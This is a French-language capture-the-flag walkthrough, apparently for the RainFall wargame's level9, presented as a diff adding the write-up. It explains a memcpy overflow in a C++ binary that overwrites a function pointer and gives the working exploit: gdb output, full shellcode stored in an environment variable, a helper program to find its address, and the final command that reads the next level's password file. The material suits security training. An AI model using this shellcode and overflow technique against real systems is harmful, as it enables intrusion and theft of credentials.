@@ -1,0 +1,88 @@
+- Apres analyse du code asm, on voit que c'est du cpp.
+- On remarque aussi qu'une classe "N" contient buffer de 100
+- Cette classe contient une méthode "setAnnotation" copiant un tableau de char
+a l'aide d'un memcpy.
+- argv[1] est copier grace à cette méthode
+- On remarque encore a un appel de pointeur sur fonction dans edx.
+
+ 8048677:       e8 92 00 00 00          call   804870e <_ZN1N13setAnnotationEPc>
+ 804867c:       8b 44 24 10             mov    0x10(%esp),%eax
+ 8048680:       8b 00                   mov    (%eax),%eax
+ 8048682:       8b 10                   mov    (%eax),%edx
+ 8048684:       8b 44 24 14             mov    0x14(%esp),%eax
+ 8048688:       89 44 24 04             mov    %eax,0x4(%esp)
+ 804868c:       8b 44 24 10             mov    0x10(%esp),%eax
+ 8048690:       89 04 24                mov    %eax,(%esp)
+ 8048693:       ff d2                   call   *%edx
+
+- Le but de cet exploit va d'etre de provoquer un overflow grace a "argv[1]"
+qui réécrira le pointeur sur fonction vers un shellcode.
+
+1) On cherche a partir de quelle taille le programme segfault :
+
+level9@RainFall:~$ ./level9 `python -c 'print "A" * 108 + "AAAA"'`
+Segmentation fault (core dumped)
+
+2) On relance gdb avec le meme argument
+
+gdb ./level9
+r `python -c 'print "A" * 108 + "AAAA"'`
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08048682 in main ()
+(gdb) i r
+eax            0x41414141       1094795585
+ecx            0x41414141       1094795585
+edx            0x804a07c        134520956
+ebx            0x804a078        134520952
+esp            0xbffff5d0       0xbffff5d0
+ebp            0xbffff5f8       0xbffff5f8
+esi            0x0      0
+
+On remarque de eax contient notre "AAAA"
+
+"AAAA" sera remplacer par une adresse mémoire
+
+3) On va avoir besoin de 2 variable d'environement
+
+TITI qui contiendra l'adresse de TOTO
+TOTO qui contiendra le shellcode
+
+4) On exporte les variable d'environement
+
+export TITI=`python -c 'print "AAAA"'`
+export TOTO=`python -c 'print "\x90" * 100 + "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xffcat /home/user/bonus0/.pass; whoami; exit"'`
+
+5) On crée un programme dans /tmp qui va nous imprimer les addresses mémoires
+de TITI et TOTO
+
+vim /tmp/getenv.c
+
+int     main(void)
+{
+        printf("TITI : %p %s\n", getenv("TITI"), getenv("TITI"));
+        printf("TOTO : %p %s\n", getenv("TOTO"), getenv("TOTO"));
+}
+
+cd /tmp
+gcc getenv.c
+cd /home/user/level9
+
+On va changer le nom de a.out du dossier /tmp afin que son la longueur de son nom soit la meme
+longueur que /home/user/level9/level9 afin d'avoir la meme configuration de la stack a l'execution
+de level9
+
+mv /tmp/a.out /tmp/level9aaaaaaaaaaaaa
+
+level9@RainFall:~$ /tmp/level9aaaaaaaaaaaaa
+TITI : 0xbffffe44 ����
+TOTO : 0xbffffe4e ����������������������������������������������������������������������������������������������������jFX1�1�̀�!_j
+         X�Rfh-c��Rh//shh/bin��RWVS��̀�����cat /home/user/bonus0/.pass; whoami; exit
+
+6) On remplace "AAAA" par 0xbffffea0 afin de viser le milieu des nop du shellcode
+
+export TITI=`python -c 'print "\xa0\xfe\xff\xbf"'`
+
+7) On execute ./level de la maniere suivante :
+
+/home/user/level9/level9 `python -c 'print "A" * 108 + "\x44\xfe\xff\xbf"'`
